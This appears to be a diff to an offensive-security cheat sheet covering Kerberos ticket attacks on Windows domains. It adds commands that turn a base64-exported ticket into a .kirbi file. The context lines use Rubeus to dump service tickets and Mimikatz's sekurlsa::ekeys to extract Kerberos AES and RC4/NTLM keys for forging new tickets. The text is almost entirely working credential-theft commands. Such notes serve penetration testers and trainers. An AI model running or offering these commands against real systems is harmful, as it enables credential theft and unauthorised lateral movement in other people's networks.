@@ -1453,6 +1453,11 @@ Rubeus.exe dump /nowrap
 # Export TGS to base64 string for use on other machines
 .\Rubeus.exe dump /luid:0x98b07 /service:cifs /nowrap
 
+# Convert base64 ticket to .kirbi file
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
+or
+cat tickett.b64 | base64 -d > ticket.kirbi
+
 (when Exported tickets fail or ticket has expired , we can run below command to extracted Encryption Keys to generate new tickets )
 # Mimikatz - Extract Kerberos keys  ( we can get AES256_HMAC and  RC4_HMAC key )  ( RC4_HMAC same NTLM hash) 
 mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
